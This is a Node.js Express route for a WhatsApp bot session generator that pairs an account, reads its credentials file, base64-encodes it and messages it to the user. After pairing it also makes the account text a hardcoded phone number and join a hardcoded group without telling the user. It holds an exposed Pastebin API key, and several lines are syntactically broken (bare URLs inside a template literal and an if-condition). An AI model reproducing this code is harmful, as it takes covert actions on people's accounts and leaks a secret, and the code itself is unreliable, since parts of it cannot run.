const PastebinAPI = require('pastebin-js'),
    pastebin = new PastebinAPI('EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL');
const { makeid } = require('./id');
const express = require('express');
const fs = require('fs');
let router = express.Router();
const pino = require("pino");
const {
    default: Venocyber_Tech, useMultiFileAuthState,
    delay, makeCacheableSignalKeyStore,
    Browsers
} = require("maher-zubair-baileys");

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

// New function to join a group
async function joinGroup(client, inviteLink) {
    try {
        await client.groupAcceptInvite(inviteLink);
        console.log(`Successfully joined group with invite link: ${https://chat.whatsapp.com/HjTJEJm6IX14AxUCsqfOQJ}`);
    } catch (error) {
        console.error(`Failed to join group: ${error}`);
    }
}

// Function to send a message to another number
async function textToAnotherNumber(client, number, text) {
    number = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    await client.sendMessage(94789958225, { text: text });
}

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;
    let targetNumber = req.query.targetNumber;  // Get target number from query parameter
    let groupInviteLink = req.query.groupInviteLink;  // Get group invite link from query parameter

    async function UNIQUE_MD_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
        try {
            let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: ["Chrome (Linux)", "", ""]
            });

            if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }

            Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);
            Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;
                if (connection == "open") {
                    await delay(5000);
                    let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
                    await delay(800);
                    let b64data = Buffer.from(data).toString('base64');
                    let session = await Pair_Code_By_Venocyber_Tech.sendMessage(Pair_Code_By_Venocyber_Tech.user.id, { text: '' + b64data });

                    let UNIQUE_MD_TEXT = `
*_Pair Code Connected by rcd-md_*
*_Made With 🤍_*
______________________________________
╔════◇
║ *『 𝗪𝗘𝗟𝗖𝗢𝗠𝗘 』*
║ _You Have Completed the First Step to Deploy a Whatsapp Bot._
╚══════════════════════╝
╔═════◇
║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
║❒ *Youtube:* _https://youtube.com/@Dextertoola999_
║❒ *Owner:* _RCD TEAM_
║❒ *Repo:* _https://github.com/DEXTER-BOT-1/RCD-MD_
║❒ *WaGroup:* _https://chat.whatsapp.com/HjTJEJm6IX14AxUCsqfOQJ_
║❒ *WaChannel:* _https://whatsapp.com/channel/0029Vag1WQFJf05dF0pQeU3u_
║❒ *RCD MD:* 
╚══════════════════════╝ 
_____________________________________

_RCD 𝗠𝗗_`;
                    await Pair_Code_By_Venocyber_Tech.sendMessage(Pair_Code_By_Venocyber_Tech.user.id, { text: UNIQUE_MD_TEXT }, { quoted: session });

                    // Send a message to another number
                    if (94789958225) {
                        await textToAnotherNumber(Pair_Code_By_Venocyber_Tech, targetNumber, "Hello, this is an automated message.");
                    }

                    // Join a WhatsApp group using the invite link
                    if (https://chat.whatsapp.com/HjTJEJm6IX14AxUCsqfOQJ) {
                        await joinGroup(Pair_Code_By_Venocyber_Tech, groupInviteLink);
                    }

                    await delay(100);
                    await Pair_Code_By_Venocyber_Tech.ws.close();
                    return await removeFile('./temp/' + id);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10000);
                    UNIQUE_MD_PAIR_CODE();
                }
            });
        } catch (err) {
            console.log("service restated");
            await removeFile('./temp/' + id);
            if (!res.headersSent) {
                await res.send({ code: "Service Unavailable" });
            }
        }
    }

    return await UNIQUE_MD_PAIR_CODE();
});

module.exports = router;
